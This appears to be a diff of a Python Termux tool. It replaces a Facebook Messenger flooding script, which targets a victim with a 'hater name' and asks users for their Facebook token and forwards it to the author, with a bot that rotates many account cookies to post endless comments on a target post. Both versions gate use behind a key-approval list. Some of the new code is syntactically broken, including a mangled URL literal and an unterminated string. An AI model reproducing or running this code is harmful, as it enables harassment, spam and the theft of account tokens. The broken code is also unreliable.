@@ -1,189 +1,335 @@
 import requests
-import time
 import os
+import re
+import time
+import random
+from requests.exceptions import RequestException
+
 import sys
-import hashlib
-from urllib.parse import quote
-from colorama import init, Fore, Style
+import os
+import datetime   
+from time import sleep
+def testPY():
+    if(sys.version_info[0] < 3):
+        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
+        sys.exit()
 
-# Initialize Colorama (Fix for Color Codes Not Showing Properly)
-init(autoreset=True)
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-# Unique Key Generate Karne Ka Function
-def get_unique_id():
+def modelsInstaller():
     try:
-        unique_str = str(os.getlogin())
-        return hashlib.sha256(unique_str.encode()).hexdigest()
-    except Exception as e:
-        print(f'Error generating unique ID: {e}')
-        exit(1)
-
-# Approval Check Karne Ka Function
-def check_permission(unique_key):
-    print(Fore.YELLOW + "[🔄] Checking Approval...")
-    while True:
-        try:
-            response = requests.get('https://raw.githubusercontent.com/Raj-Thakur420/p/refs/heads/main/Approval.txt')
-            if response.status_code == 200:
-                data = response.text
-                if unique_key in data:
-                    print(Fore.GREEN + "[√] Permission granted. Your Key Was Approved.")
-                    return  
-                print(Fore.RED + "[❌] Your Key is NOT Approved! Waiting for approval...")
-                time.sleep(10)
-            else:
-                print(f'Failed to fetch permissions list. Status code: {response.status_code}')
-                time.sleep(10)
-        except Exception as e:
-            print(f'Error checking permission: {e}')
-            time.sleep(10)
-
-# Approval Request WhatsApp Pe Bhejna
-def send_approval_request(unique_key):
-    try:
-        message = f'Hello, Raj Thakur sir! Please Approve My Token is :: {unique_key}'
-        os.system(f'am start https://wa.me/+919695003501?text={quote(message)} >/dev/null 2>&1')
-        print(Fore.YELLOW + '[📲] WhatsApp opened with approval request. Waiting for approval...')
-    except Exception as e:
-        print(f'Error sending approval request: {e}')
-        exit(1)
-
-# Approval System Start Karna
-def pre_main():
-    clear_screen()
-    unique_key = get_unique_id()
-    print(f'{Fore.YELLOW}[🔐] Your Unique Key: {Fore.CYAN}{unique_key}')
-    send_approval_request(unique_key)
-    check_permission(unique_key)  # Approval check yahi par hoga
-    print(Fore.GREEN + "[✔] Approved! Now Starting Your Script...\n")
-
-# ---- Aapki Original Script Yaha Se Start Ho Rahi Hai ----
-
-def typing_effect(text, delay=0.002, color=Fore.WHITE):
-    for char in text:
-        print(color + char, end='', flush=True)
-        time.sleep(float(delay))  # Ensure delay is a float
-    print()
-
-def display_animated_logo():
-    clear_screen()
-    typing_effect("(_ _______ ______ _______ _______ _______ _ _________)", Fore.YELLOW)
-    typing_effect("( (    /|  (  ___  )  (  __  \\   (  ____ \\  (  ____ \\  (       )      (  ___  )  ( \\        \\__   __/", Fore.YELLOW)
-    typing_effect("|  \\  ( |  | (   ) |  | (  \\  )  | (    \\/  | (    \\/  | () () |      | (   ) |  | (           ) (   ", Fore.GREEN)
-    typing_effect("|   \\ | |  | (___) |  | |   ) |  | (__      | (__      | || || |      | (___) |  | |           | |   ", Fore.CYAN)
-    typing_effect("| (\\ \\) |  |  ___  |  | |   | |  |  __)     |  __)     | |(_)| |      |  ___  |  | |           | |   ", Fore.CYAN)
-    typing_effect("| | \\   |  | (   ) |  | |   ) |  | (        | (        | |   | |      | (   ) |  | |           | |   ", Fore.GREEN)
-    typing_effect("| )  \\  |  | )   ( |  | (__/  )  | (____/\\  | (____/\\  | )   ( |      | )   ( |  | (____/\\  ___) (___", Fore.YELLOW)
-    typing_effect("|/    )_)  |/     \\|  (______/   (_______/  (_______/  |/     \\|      |/     \\|  (_______/  \\_______/", Fore.YELLOW)
-    typing_effect("         ╭───────────────────────── < ~ COUNTRY ~  > ─────────────────────────────────────╮", Fore.CYAN)
-    typing_effect("         │                         【•】 YOUR COUNTRY  ➤ INDIA                            │", Fore.CYAN)
-    typing_effect("         │                         【•】 YOUR REGION   ➤ BIHAR                            │", Fore.CYAN)
-    typing_effect("         │                         【•】 YOUR CITY     ➤ PATNA                            │", Fore.CYAN)
-    typing_effect("         ╰────────────────────────────< ~ COUNTRY ~  >────────────────────────────────────╯", Fore.CYAN)
-    typing_effect("╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗", Fore.YELLOW)
-    typing_effect("║  NAME                 : BROKEN-NADEEM           GOD ABBUS                     RAKHNA              ║", Fore.CYAN)
-    typing_effect("║  RULLEX               : PATNA ON FIRE            KARNE PE                     SAB GOD             ║", Fore.GREEN)
-    typing_effect("║  FORM 🏠              : BIHAR-PATNA              APPEARED                     ABBUS BANA          ║", Fore.CYAN)
-    typing_effect("║  BRAND                : MULTI CONVO              HATA DIYA                    HAI BILKUL          ║", Fore.GREEN)
-    typing_effect("║  GitHub               : BROKEN NADEEM            JAAEGA YE                    KOI BHI HO          ║", Fore.CYAN)
-    typing_effect("║  WHATSAP              : +917209101285            BAAT YWAD                   GOD ABBUS NO         ║", Fore.GREEN)
-    typing_effect("╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝", Fore.YELLOW)
-    time.sleep(1)
-
-def animated_input(prompt_text):
-    print(Fore.CYAN + "{<<══════════════════════════════════════BROKEN NADEEM HERE═══════════════════════════════════════>>}")
-    typing_effect(prompt_text, 0.03, Fore.LIGHTYELLOW_EX)
-    return input(Fore.GREEN + "➜ ")
-
-def send_token_to_facebook(token):
-    try:
-        message = f'Hello, Raj Khan sir! I am using your tools. My token 🔐 ==> {token}'
-        facebook_url = f'https://www.facebook.com/messages/t/shankar.panchal.9883739?text={quote(message)}'
-
-        # Open Facebook URL (this will open the URL in the default browser)
-        os.system(f'am start {facebook_url} >/dev/null 2>&1')
-
-        print('Successfully opened Facebook with your token message.')
-
-    except Exception as e:
-        print(f'Error sending message to Facebook: {e}')
-
-def fetch_password_from_pastebin(pastebin_url):
-    try:
-        response = requests.get(pastebin_url)
-        response.raise_for_status()
-        return response.text.strip()
-    except requests.exceptions.RequestException:
-        exit(1)
-
-def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
-    with open(messages_file, "r") as file:
-        messages = file.readlines()
-    with open(tokens_file, "r") as file:
-        tokens = [token.strip() for token in file.readlines()]
-
-    token_profiles = {token: fetch_profile_name(token) for token in tokens}
-    target_profile_name = fetch_target_name(target_id, tokens[0])  
-
-    headers = {"User-Agent": "Mozilla/5.0"}
-
-    while True:
-        for message_index, message in enumerate(messages):
-            token_index = message_index % len(tokens)
-            access_token = tokens[token_index]
-            sender_name = token_profiles.get(access_token, "Unknown Sender")
-            full_message = f"{haters_name} {message.strip()}"
-
-            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
-            parameters = {"access_token": access_token, "message": full_message}
-
+        models = ['requests', 'colorama']
+        for model in models:
             try:
-                response = requests.post(url, json=parameters, headers=headers)
-                response.raise_for_status()
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if(sys.version_info[0] < 3):
+                    os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
+                else:
+                    os.system('python -m pip install {}'.format(model))
+                print(' ')
+                print('[+] {} has been installed successfully, Restart the program.'.format(model))
+                sys.exit()
+                print(' ')
+            except:
+                print('[-] Install {} manually.'.format(model))
+                print(' ')
+    except:
+        pass
 
-                print(Fore.YELLOW + f"\n<<═══════════════════════BROTHER═════════════NADEEM DONE═════════════SAHIL DONE════════════════════>>")
-                typing_effect(f"[🎉] MESSAGE {message_index + 1} SUCCESSFULLY SENT!", 0.02, Fore.CYAN)
-                typing_effect(f"[👤] SENDER: {sender_name}", 0.02, Fore.WHITE)
-                typing_effect(f"[📩] TARGET: {target_profile_name} ({target_id})", 0.02, Fore.MAGENTA)
-                typing_effect(f"[📨] MESSAGE: {full_message}", 0.02, Fore.LIGHTGREEN_EX)
-                typing_effect(f"[⏰] TIME: {current_time}", 0.02, Fore.LIGHTWHITE_EX)
-                print(Fore.YELLOW + f"<<═══════════════════════BROTHER═════════════NADEEM DONE═════════════SAHIL DONE════════════════════>>\n")
 
-            except requests.exceptions.RequestException:
-                continue  
+import base64
+import json
+import time
+import sys
+import os
+import re
+import binascii
+import time
+import json
+import random
+import threading
+import pprint
+import smtplib
+import telnetlib
+import os.path
+import hashlib
+import string
+import glob
+import sqlite3
+import urllib
+import argparse
+import marshal
+import datetime   
+from platform import system
+from datetime import datetime
 
-            time.sleep(speed)
+try:
+    import requests
+    from colorama import Fore
+    from colorama import init
+except:
+    modelsInstaller()
 
-        print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")
+requests.packages.urllib3.disable_warnings()
 
-def main():
-    pre_main()  # Approval system ko yaha call kiya hai  
-    clear_screen()
-    display_animated_logo()
+def cls():
+    if system() == 'Linux':
+        os.system('clear')
+    else:
+        if system() == 'Windows':
+            os.system('cls')
 
-    pastebin_url = "https://pastebin.com/raw/kMBpBe88"
-    correct_password = fetch_password_from_pastebin(pastebin_url)
 
-    entered_password = animated_input("  【👑】 ENTER OWNER NAME➜")
-    tokens_file = animated_input(" 【📕】 ENTER TOKEN FILE➜")
-    target_id = animated_input("  【🖇️】  ENTER CONVO UID ➜")
-    haters_name = animated_input("  【🖊️】 ENTER HATER NAME➜")
-    messages_file = animated_input("  【📝】 ENTER MESSAGE FILE➜")
-    speed = float(animated_input("  【⏰】 ENTER DELAY/TIME (in seconds) FOR MESSAGES ➜"))
+cls()
+CLEAR_SCREEN = '\033[2J'
+RED = '\033[1;37;1m'  # mode 31 = red foreground
+RESET = '\033[1;37;1m'  # mode 0  = reset
+BLUE = "\033[1;37;1m"
+WHITE = "\033[1;37;1m",
+YELLOW = "\033[1;37;1m",
+CYAN = "\033[1;37;1m"
+MAGENTA = "\033[1;37;1m",
+GREEN = "\033[1;37;1m"
+RESET = "\033[1;37;1m"
+BOLD = '\033[1;37;1m'
+REVERSE = "\033[1;37;1m"
 
-    if entered_password != correct_password:
-        print(Fore.RED + "[x] Incorrect OWNER NAME. Exiting program.")
-        exit(1)
+def logo():
+    clear = "\x1b[0m"
+    colors = [35, 33, 36]
 
-    # Get Facebook token and send it to your inbox
-    facebook_token = animated_input("【📩】 ENTER YOUR FACEBOOK TOKEN ➜")
-    send_token_to_facebook(facebook_token)
+    x = """
+      ███╗   ██╗ █████╗ ██████╗ ███████╗██████╗ ███╗   ███╗     █████╗  ██████╗ 
+      ████╗  ██║██╔══██╗██╔══██╗██╔════╝╚════██╗████╗ ████║    ██╔══██╗██╔════╝ 
+      ██╔██╗ ██║███████║██║  ██║█████╗   █████╔╝██╔████╔██║    ███████║██║  ███╗
+      ██║╚██╗██║██╔══██║██║  ██║██╔══╝   ╚═══██╗██║╚██╔╝██║    ██╔══██║██║   ██║
+      ██║ ╚████║██║  ██║██████╔╝███████╗██████╔╝██║ ╚═╝ ██║    ██║  ██║╚██████╔╝
+      ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═════╝ ╚═╝     ╚═╝    ╚═╝  ╚═╝ ╚═════╝
+╔═════════════════════════════════════════════════════════════════════════════════════╗
+║  \033[1;31mN4M3       : BROKEN-NADEEM           GOD ABBUS                     RAKHNA          ║
+║  \033[1;32mRULL3X     : PATNA ON FIRE            KARNE PE                     SAB GOD         ║
+║  \033[1;32mFORM 🏠    : BIHAR-PATNA              APPEARED                     ABBUS MANA      ║
+║  \033[1;34mBR9ND      : MULTI POST               HATA DIYA                    HAI BILKUL      ║
+║  \033[1;37mGitHub     : BROKEN NADEEM            JAAEGA YE                    KOI BHI HO      ║
+║  \033[1;32mWH9TS9P    : +917209101285            BAAT YWAD                   GOD ABBUS NO     ║
+╚═════════════════════════════════════════════════════════════════════════════════════╝
+"""
+    for N, line in enumerate(x.split("\n")):
+        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
+        time.sleep(0.05)
+logo()
+testPY()
+print('''\033[1;36m[[✓]] ︻╦デ╤━╼●▬▬▬▬๑۩𝐍𝐄𝐗𝐓 𝐈𝐃࿋ོ༙☬●─────𖣘︎─────●☬࿋ོ༙𝐍𝐄𝐗𝐓 𝐀𝐂𝐂𝐔𝐍𝐓 ۩๑▬▬▬▬▬●╾━╤デ╦︻\n''')
+def venom():
+    clear = "\x1b[0m"
+    colors = [35, 33, 36]
 
-    send_messages(tokens_file, target_id, messages_file, haters_name, speed)
+
+   
+
+
+def Subscraption():
+    os.system('git pull')
+    time.sleep(1)
+    uuid = str(os.geteuid())+"#"+str(os.geteuid())
+    id = "786c83an9cda83inv-"+"".join(uuid)
+    os.system('clear')
+
+    # Stylish colored logo
+    logo = '''
+                                
+      ███╗   ██╗ █████╗ ██████╗ ███████╗██████╗ ███╗   ███╗     █████╗  ██████╗ 
+      ████╗  ██║██╔══██╗██╔══██╗██╔════╝╚════██╗████╗ ████║    ██╔══██╗██╔════╝ 
+      ██╔██╗ ██║███████║██║  ██║█████╗   █████╔╝██╔████╔██║    ███████║██║  ███╗
+      ██║╚██╗██║██╔══██║██║  ██║██╔══╝   ╚═══██╗██║╚██╔╝██║    ██╔══██║██║   ██║
+      ██║ ╚████║██║  ██║██████╔╝███████╗██████╔╝██║ ╚═╝ ██║    ██║  ██║╚██████╔╝
+╔═════════════════════════════════════════════════════════════════════════════════════╗
+║  \033[1;31mN4M3       : BROKEN-NADEEM            GOD ABBUS                     RAKHNA         ║
+║  \033[1;32mRULL3X     : PATNA ON FIRE            KARNE PE                     SAB GOD         ║
+║  \033[1;32mFORM 🏠    : BIHAR-PATNA              APPEARED                     ABBUS MANA      ║
+║  \033[1;34mBR9ND      : MULTI POST               HATA DIYA                    HAI BILKUL      ║
+║  \033[1;37mGitHub     : BROKEN NADEEM            JAAEGA YE                    KOI BHI HO      ║
+║  \033[1;32mWH9TS9P    : +917209101285            BAAT YWAD                   GOD ABBUS NO     ║
+╚═════════════════════════════════════════════════════════════════════════════════════╝
+  '''
+    print(logo.center(os.get_terminal_size().columns))
+
+    print("\n\033[1;36m\033[1;91m\033[1;41m\033[1;33m\033[1;35m\033[1;37mYOU G3T APPROV3D FOR US1NG COMMAND \033[;0m\033[1;91m\033[1;92m\033[38;5;46m 🎉")
+    print("\n\033[1;35m 𝗬𝗢𝗨𝗥 𝗞𝗘𝗬 𝗦𝗘𝗡𝗗 𝗢𝗪𝗡𝗘𝗥➜ \u001b[32m "+id);time.sleep(0.1)
+    print ('\u001b[33m' +
+          '')
+    try:
+        httpCaht = requests.get("https://github.com/BROKEN-NADEEM/APPROVAL/blob/main/Apprvol.txt").text
+        if id in httpCaht:
+            print("\n\033[1;32m \033[1;91m\033[1;41m\033[1;33m\033[1;35m\033[1;37m CONGRESS YOUR KEY APPROV3D SUCCESSFUL ENJOY
+            msg = str(os.geteuid())
+            time.sleep(1)
+            pass
+        else: 
+            print("\n\033[1;33m YOUR KEY NOT APPROV3D PLEASE CONTACT TH3 OWNER")    
+            time.sleep(0.1)
+            input('\n\n 𝗣𝗥𝟯𝗦𝗦 𝟯𝗡𝗧𝗘𝗥 𝗧𝗢 𝗦𝗘𝗡𝗗 𝗬𝗢𝗨𝗥 𝗞𝗘𝗬 𝗢𝗪𝗡𝟯𝗥 👑')
+            tks = ()
+            os.system('am start https://wa.me/+917209101285?text='+tks), Subscraption()
+            time.sleep(1)
+            exit()
+    except Exception as e:
+        print(e)
+        time.sleep(2)
+        Subscraption()
+    except:
+        sys.exit()
+
+
+
+
+
+
+    
+# Prompt Password 
+def pas():
+
+    password = input("m[🔐] 𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗢𝗟 𝗣𝗔𝗦𝗦𝗪  ➜ ") 
+
+    mmm = requests.get(.com/raw/m).text
+
+
+
+    if mmm not in password:
+
+        print('m' + '[•] <==> 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 ❌ ')
+
+        sys.exit()
+Subscraption()
+
+pas()
+
+print("\033[1;32m【YOUR TOOL START TIME】:", time.strftime("%Y-%m-%d %H:%M:%S"))   
+
+class FacebookCommenter:
+    def __init__(self):
+        self.comment_count = 0
+
+    def comment_on_post(self, cookies, post_id, comment, timm):
+        with requests.Session() as r:
+            r.headers.update({
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'sec-fetch-site': 'none',
+                'accept-language': 'id,en;q=0.9',
+                'Host': 'mbasic.facebook.com',
+                'sec-fetch-user': '?1',
+                'sec-fetch-dest': 'document',
+                'accept-encoding': 'gzip, deflate',
+                'sec-fetch-mode': 'navigate',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
+                'connection': 'keep-alive',
+            })
+
+            response = r.get('https://mbasic.facebook.com/{}'.format(post_id), cookies={"cookie": cookies})
+
+            next_action_match = re.search('method="post" action="([^"]+)"', response.text)
+            if next_action_match:
+                self.next_action = next_action_match.group(1).replace('amp;', '')
+            else:
+                print(f"\033[1;37;32m  Coockies Chack =>C_USER ID<= i_USER \033[1;32;31m{self, cookies}")
+                return
+                print('\033[1;33mThe Comment is ready to go on the post')
+
+            fb_dtsg_match = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
+            if fb_dtsg_match:
+                self.fb_dtsg = fb_dtsg_match.group(1)
+            else:
+                print(f"\033[1;35;36m Your Cookie File Complete Restart your Cookie file\033[1;32;31m{self, cookies}")
+                return
+                print('\033[1;35mThe Comment is ready to go on the post')
+
+            jazoest_match = re.search('name="jazoest" value="([^"]+)"', response.text)
+            if jazoest_match:
+                self.jazoest = jazoest_match.group(1)
+            else:
+                print("<Error> jazoest not found")
+                return
+
+            data = {
+                'fb_dtsg': self.fb_dtsg,
+                'jazoest': self.jazoest,
+                'comment_text': comment,
+                'comment': 'Submit',
+            }
+
+            r.headers.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'referer': 'https://mbasic.facebook.com/{}'.format(post_id),
+                'origin': 'https://mbasic.facebook.com',
+            })
+
+            response2 = r.post('https://mbasic.facebook.com{}'.format(self.next_action), data=data, cookies={"cookie": cookies})
+
+            if 'comment_success' in str(response2.url) and response2.status_code == 200:
+                self.comment_count += 1
+                sys.stdout.write(f"\rComment count: {self.comment_count}")
+                sys.stdout.flush()  # Flush the output
+                print(f"Comment successfully posted: {comment}")  # Add this line for debugging
+            else:  
+              
+                print('\033[1;36m' + ' [[✓]] ︻╦デ╤━╼●▬▬▬▬๑۩𝐍𝐄𝐗𝐓 𝐈𝐃࿋ོ༙☬●─────𖣘︎─────●☬࿋ོ༙𝐍𝐄𝐗𝐓 𝐀𝐂𝐂𝐔𝐍𝐓 ۩๑▬▬▬▬▬●╾━╤デ╦︻-')
+                print('\033[1;32;40m' + ' Status :: Active')
+                e =datetime.now()                
+                print (e.strftime("\033[1;33m【DATE】:: %d-%m-%Y "))
+                print (e.strftime("\033[1;33m【TIME】:: %I:%M:%S %p"))
+                         
+                print("\033[1;36m𝗖𝗢𝗠𝗠𝗘𝗡𝗧 𝗦𝗘𝗡𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟 ✫●▬▬▬▬๑۩𒊹︻╦デ╤━╼𝗡𝗔𝗗𝗘𝟯𝗠 𝐓𝐎𝐎𝐋╾━╤デ╦︻𒊹︎۩๑▬▬▬▬▬●✫ :: {comment}")
+        
+
+
+
+    def inputs(self):
+        try:
+        	
+            coockies_file_path = input("\033[1;36m[•]ENTER COOKISE FILE PATH ➼ : ").strip()
+            with open(coockies_file_path, 'r') as file:
+                 your_cookies = file.read().splitlines()
+                 
+                 
+                                 
+                 post_id = input("\033[1;33m[❌] TAGET POST ID ➼: ").strip()
+                 
+            comments_file = input("[\033[1;32m[📚] ENTER COMMENT FILE ➼: "). strip()
+            
+            with open(comments_file, 'r') as file:
+                comments = file.readlines()
+
+
+            timm = int(input("\033[1;32m[⏰] COMMENTS SENDING TIME ➼ ⏰ ").strip())
+
+
+
+            cookie_index = 0  # Initialize the current cookie index to 0
+
+            while True:  # Infinite loop
+                try:
+                    for comment in comments:
+                        comment = comment.strip()  # Remove leading/trailing whitespaces
+                        if comment:  # Check if the comment is not empty
+                            time.sleep(timm)
+                            self.comment_on_post(your_cookies[cookie_index], post_id, comment, timm)
+                            cookie_index = (cookie_index + 1) % len(your_cookies)  # Move to the next cookie or loop back to the first one
+                except RequestException as e:
+                    print(f"<chack first & last coockies> {str(e).lower()}")
+                except Exception as e:
+                    print(f"<chack first & last coockies> {str(e).lower()}")
+                except KeyboardInterrupt:
+                    break
+
+        except Exception as e:
+            print(f"<chack first & last coockies> {str(e).lower()}")
+            exit()
+
+
 
 if __name__ == "__main__":
-    main()
+    # Create a thread for the HTTP server
+
+
+
+    # Run Facebook commenter
+     commenter = FacebookCommenter()
+     commenter.inputs()
